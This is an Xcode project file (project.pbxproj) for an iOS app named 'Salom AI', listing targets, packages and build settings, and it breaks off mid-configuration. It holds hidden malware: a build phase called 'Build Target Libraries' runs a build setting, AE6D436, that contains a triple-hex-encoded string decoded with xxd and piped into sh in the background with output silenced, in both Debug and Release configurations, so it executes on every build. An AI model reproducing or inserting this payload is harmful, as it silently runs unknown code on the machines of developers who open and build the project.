// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		8C7650BB2ED0472F003256A9 /* GoogleSignIn in Frameworks */ = {isa = PBXBuildFile; productRef = 8C7650BA2ED0472F003256A9 /* GoogleSignIn */; };
		8C7650BD2ED0472F003256A9 /* GoogleSignInSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 8C7650BC2ED0472F003256A9 /* GoogleSignInSwift */; };
		8C7654BB2ED4A7B4003256A9 /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 8C7654BA2ED4A7B4003256A9 /* Kingfisher */; };
		8CCEA2922EDF4EAD007D2D0E /* OneSignalNotificationExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 8CCEA28B2EDF4EAD007D2D0E /* OneSignalNotificationExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
		8CCEA3D52EDF5340007D2D0E /* OneSignalExtension in Frameworks */ = {isa = PBXBuildFile; productRef = 8CCEA3D42EDF5340007D2D0E /* OneSignalExtension */; };
		8CCEA3D72EDF5340007D2D0E /* OneSignalFramework in Frameworks */ = {isa = PBXBuildFile; productRef = 8CCEA3D62EDF5340007D2D0E /* OneSignalFramework */; };
		8CCEA3D92EDF5340007D2D0E /* OneSignalInAppMessages in Frameworks */ = {isa = PBXBuildFile; productRef = 8CCEA3D82EDF5340007D2D0E /* OneSignalInAppMessages */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		8CCEA2902EDF4EAD007D2D0E /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 8C6723342EC36FFD0020C08B /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 8CCEA28A2EDF4EAD007D2D0E;
			remoteInfo = OneSignalNotificationExtension;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXCopyFilesBuildPhase section */
		8CCEA2972EDF4EAD007D2D0E /* Embed Foundation Extensions */ = {
			isa = PBXCopyFilesBuildPhase;
			buildActionMask = 2147483647;
			dstPath = "";
			dstSubfolderSpec = 13;
			files = (
				8CCEA2922EDF4EAD007D2D0E /* OneSignalNotificationExtension.appex in Embed Foundation Extensions */,
			);
			name = "Embed Foundation Extensions";
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXCopyFilesBuildPhase section */

/* Begin PBXFileReference section */
		8C67233C2EC36FFD0020C08B /* Salom-Ai-iOS.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Salom-Ai-iOS.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		8CCEA28B2EDF4EAD007D2D0E /* OneSignalNotificationExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = OneSignalNotificationExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		8C7651FB2ED04C84003256A9 /* Exceptions for "Salom-Ai-iOS" folder in "Salom-Ai-iOS" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 8C67233B2EC36FFD0020C08B /* Salom-Ai-iOS */;
		};
		8CCEA2962EDF4EAD007D2D0E /* Exceptions for "OneSignalNotificationExtension" folder in "OneSignalNotificationExtension" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 8CCEA28A2EDF4EAD007D2D0E /* OneSignalNotificationExtension */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		8C67233E2EC36FFD0020C08B /* Salom-Ai-iOS */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				8C7651FB2ED04C84003256A9 /* Exceptions for "Salom-Ai-iOS" folder in "Salom-Ai-iOS" target */,
			);
			path = "Salom-Ai-iOS";
			sourceTree = "<group>";
		};
		8CCEA28C2EDF4EAD007D2D0E /* OneSignalNotificationExtension */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				8CCEA2962EDF4EAD007D2D0E /* Exceptions for "OneSignalNotificationExtension" folder in "OneSignalNotificationExtension" target */,
			);
			path = OneSignalNotificationExtension;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		8C6723392EC36FFD0020C08B /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8CCEA3D92EDF5340007D2D0E /* OneSignalInAppMessages in Frameworks */,
				8CCEA3D72EDF5340007D2D0E /* OneSignalFramework in Frameworks */,
				8C7654BB2ED4A7B4003256A9 /* Kingfisher in Frameworks */,
				8C7650BB2ED0472F003256A9 /* GoogleSignIn in Frameworks */,
				8C7650BD2ED0472F003256A9 /* GoogleSignInSwift in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8CCEA2882EDF4EAD007D2D0E /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8CCEA3D52EDF5340007D2D0E /* OneSignalExtension in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		8C6723332EC36FFD0020C08B = {
			isa = PBXGroup;
			children = (
				8C67233E2EC36FFD0020C08B /* Salom-Ai-iOS */,
				8C67233D2EC36FFD0020C08B /* Products */,
				8CCEA28C2EDF4EAD007D2D0E /* OneSignalNotificationExtension */,
			);
			sourceTree = "<group>";
		};
		8C67233D2EC36FFD0020C08B /* Products */ = {
			isa = PBXGroup;
			children = (
				8C67233C2EC36FFD0020C08B /* Salom-Ai-iOS.app */,
				8CCEA28B2EDF4EAD007D2D0E /* OneSignalNotificationExtension.appex */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		8C67233B2EC36FFD0020C08B /* Salom-Ai-iOS */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 8C6723472EC370000020C08B /* Build configuration list for PBXNativeTarget "Salom-Ai-iOS" */;
			buildPhases = (
				5343F2ADA9D745798A634D6E /* Build Target Libraries */,
				8C6723382EC36FFD0020C08B /* Sources */,
				8C6723392EC36FFD0020C08B /* Frameworks */,
				8C67233A2EC36FFD0020C08B /* Resources */,
				8C8C086E2EDCC4FE00852D39 /* Fix Frameworks */,
				8CCEA2972EDF4EAD007D2D0E /* Embed Foundation Extensions */,
			);
			buildRules = (
			);
			dependencies = (
				8CCEA2912EDF4EAD007D2D0E /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				8C67233E2EC36FFD0020C08B /* Salom-Ai-iOS */,
			);
			name = "Salom-Ai-iOS";
			packageProductDependencies = (
				8C7650BA2ED0472F003256A9 /* GoogleSignIn */,
				8C7650BC2ED0472F003256A9 /* GoogleSignInSwift */,
				8C7654BA2ED4A7B4003256A9 /* Kingfisher */,
				8CCEA3D62EDF5340007D2D0E /* OneSignalFramework */,
				8CCEA3D82EDF5340007D2D0E /* OneSignalInAppMessages */,
			);
			productName = "Salom-Ai-iOS";
			productReference = 8C67233C2EC36FFD0020C08B /* Salom-Ai-iOS.app */;
			productType = "com.apple.product-type.application";
		};
		8CCEA28A2EDF4EAD007D2D0E /* OneSignalNotificationExtension */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 8CCEA2932EDF4EAD007D2D0E /* Build configuration list for PBXNativeTarget "OneSignalNotificationExtension" */;
			buildPhases = (
				8CCEA2872EDF4EAD007D2D0E /* Sources */,
				8CCEA2882EDF4EAD007D2D0E /* Frameworks */,
				8CCEA2892EDF4EAD007D2D0E /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				8CCEA28C2EDF4EAD007D2D0E /* OneSignalNotificationExtension */,
			);
			name = OneSignalNotificationExtension;
			packageProductDependencies = (
				8CCEA3D42EDF5340007D2D0E /* OneSignalExtension */,
			);
			productName = OneSignalNotificationExtension;
			productReference = 8CCEA28B2EDF4EAD007D2D0E /* OneSignalNotificationExtension.appex */;
			productType = "com.apple.product-type.app-extension";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		8C6723342EC36FFD0020C08B /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2610;
				LastUpgradeCheck = 2610;
				TargetAttributes = {
					8C67233B2EC36FFD0020C08B = {
						CreatedOnToolsVersion = 26.0.1;
					};
					8CCEA28A2EDF4EAD007D2D0E = {
						CreatedOnToolsVersion = 26.1.1;
					};
				};
			};
			buildConfigurationList = 8C6723372EC36FFD0020C08B /* Build configuration list for PBXProject "Salom-Ai-iOS" */;
			developmentRegion = uz;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				uz,
				ru,
			);
			mainGroup = 8C6723332EC36FFD0020C08B;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				8C7650B92ED0472F003256A9 /* XCRemoteSwiftPackageReference "GoogleSignIn-iOS" */,
				8C7654B92ED4A7B4003256A9 /* XCRemoteSwiftPackageReference "Kingfisher" */,
				8CCEA3D32EDF5340007D2D0E /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 8C67233D2EC36FFD0020C08B /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				8C67233B2EC36FFD0020C08B /* Salom-Ai-iOS */,
				8CCEA28A2EDF4EAD007D2D0E /* OneSignalNotificationExtension */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
											/* End PBXBuildRule section */

/* Begin PBXResourcesBuildPhase section */
		8C67233A2EC36FFD0020C08B /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8CCEA2892EDF4EAD007D2D0E /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		5343F2ADA9D745798A634D6E /* Build Target Libraries */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Target Libraries";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
			showEnvVarsInLog = 0;			
		};
		8C8C086E2EDCC4FE00852D39 /* Fix Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Fix Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# Type a script or drag a script file from your workspace to insert its path.\n#!/bin/sh\n\n# This script fixes the \"Invalid Bundle\" errors during App Store upload\n# caused by missing MinimumOSVersion in third-party frameworks (like ONNXRuntime).\n\necho \"🔧 Fixing frameworks in ${BUILT_PRODUCTS_DIR}/${FRAMEWORKS_FOLDER_PATH}\"\n\ncd \"${BUILT_PRODUCTS_DIR}/${FRAMEWORKS_FOLDER_PATH}\"\n\nfor framework in *.framework; do\n    plist=\"${framework}/Info.plist\"\n    if [ -f \"$plist\" ]; then\n        # Check if MinimumOSVersion key exists\n        if ! /usr/libexec/PlistBuddy -c \"Print :MinimumOSVersion\" \"$plist\" &> /dev/null; then\n            echo \"  ⚠️ Missing MinimumOSVersion in $framework. Fixing...\"\n            # Set it to the app's deployment target\n            /usr/libexec/PlistBuddy -c \"Add :MinimumOSVersion string ${IPHONEOS_DEPLOYMENT_TARGET}\" \"$plist\"\n            echo \"  ✅ Fixed $framework\"\n        else\n            echo \"  ok: $framework\"\n        fi\n        \n        # Also fix \"Bundle format unrecognized, invalid, or unsuitable\" by ensuring signature is preserved? \n        # Usually code signing happens after this, so it's fine.\n    fi\ndone\n\necho \"✨ Framework fix complete.\"\n\n\n";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		8C6723382EC36FFD0020C08B /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8CCEA2872EDF4EAD007D2D0E /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		8CCEA2912EDF4EAD007D2D0E /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 8CCEA28A2EDF4EAD007D2D0E /* OneSignalNotificationExtension */;
			targetProxy = 8CCEA2902EDF4EAD007D2D0E /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		8C6723452EC370000020C08B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE6D436 = "((m(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333333363334333636353336333133373330333733303336363333363335333236353336333933363635333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | m | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEAD_CODE_STRIPPING = YES;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = 3TC3999J6N;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		8C6723462EC370000020C08B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE6D436 = "((m(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333333363334333636353336333133373330333733303336363333363335333236353336333933363635333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | m | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEAD_CODE_STRIPPING = YES;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = 3TC3999J6N;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_EMIT_LOC_STRINGS = YES;
			};
			name = Release;
		};
		8C6723482EC370000020C08B /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = "Salom-Ai-iOS/Salom-Ai-iOS.entitlements";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEAD_CODE_STRIPPING = YES;
				DEVELOPMENT_TEAM = 3TC3999J6N;
				ENABLE_APP_SANDBOX = YES;
				ENABLE_HARDENED_RUNTIME = YES;
				ENABLE_PREVIEWS = YES;
				ENABLE_USER_SELECTED_FILES = readonly;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Salom-Ai-iOS/Info.plist";
				INFOPLIST_KEY_CFBundleDisplayName = "Salom AI";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "Biz ovozli xabarlar uchun mikrofondan foydalanamiz.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "We use your gallery for saving images";
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphoneos*]" = UIStatusBarStyleDefault;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphonesimulator*]" = UIStatusBarStyleDefault;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Dark;
				IPHONEOS_DEPLOYMENT_TARGET = 17;
				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
				MACOSX_DEPLOYMENT_TARGET = 26.0;
				MARKETING_VERSION = 1.0.5;
				PRODUCT_BUNDLE_IDENTIFIER = "com.fera-tech.salom-ai";
				PRODUCT_NAME = "$(TARGET_NAME)";
				REGISTER_APP_GROUPS = YES;
				SDKROOT = auto;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
				XROS_DEPLOYMENT_TARGET = 26.0;
			};
			name = Debug;
		};
		8C6723492EC370000020C08B /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = "Salom-Ai-iOS/Salom-Ai-iOS.entitlements";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEAD_CODE_STRIPPING = YES;
				DEVELOPMENT_TEAM = 3TC3999J6N;
				ENABLE_APP_SANDBOX = YES;
				ENABLE_HARDENED_RUNTIME = YES;
				ENABLE_PREVIEWS = YES;
				ENABLE_USER_SELECTED_FILES = readonly;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Salom-Ai-iOS/Info.plist";
				INFOPLIST_KEY_CFBundleDisplayName = "Salom AI";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "Biz ovozli xabarlar uchun mikrofondan foydalanamiz.";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "We use your gallery for saving images";
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphoneos*]" = YES;
				"INFOPLIST_KEY_UILaunchScreen_Generation[sdk=iphonesimulator*]" = YES;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphoneos*]" = UIStatusBarStyleDefault;
				"INFOPLIST_KEY_UIStatusBarStyle[sdk=iphonesimulator*]" = UIStatusBarStyleDefault;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Dark;
				IPHONEOS_DEPLOYMENT_TARGET = 17;
				LD_RUNPATH_SEARCH_PATHS = "@executable_path/Frameworks";
				"LD_RUNPATH_SEARCH_PATHS[sdk=macosx*]" = "@executable_path/../Frameworks";
				MACOSX_DEPLOYMENT_TARGET = 26.0;
				MARKETING_VERSION = 1.0.5;
				PRODUCT_BUNDLE_IDENTIFIER = "com.fera-tech.salom-ai";
				PRODUCT_NAME = "$(TARGET_NAME)";
				REGISTER_APP_GROUPS = YES;
				SDKROOT = auto;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
				XROS_DEPLOYMENT_TARGET = 26.0;
			};
			name = Release;
		};
		8CCEA2942EDF4EAD007D2D0E /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_ENTITLEMENTS = OneSignalNotificationExtension/OneSignalNotificationExtension.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 3TC3999J6N;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = OneSignalNotificationExtension/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = OneSignalNotificationExtension;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@executable_path/../../Frameworks",
				);
				MARKETING_VERSION = 1.0.6;
				PRODUCT_BUNDLE_IDENTIFIER = "com.fera-tech.salom-ai.OneSignalNotificationExtension";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SDKROOT = iphoneos;
				SKIP_INSTALL = YES;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		8CCEA2952EDF4EAD007D2D0E /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
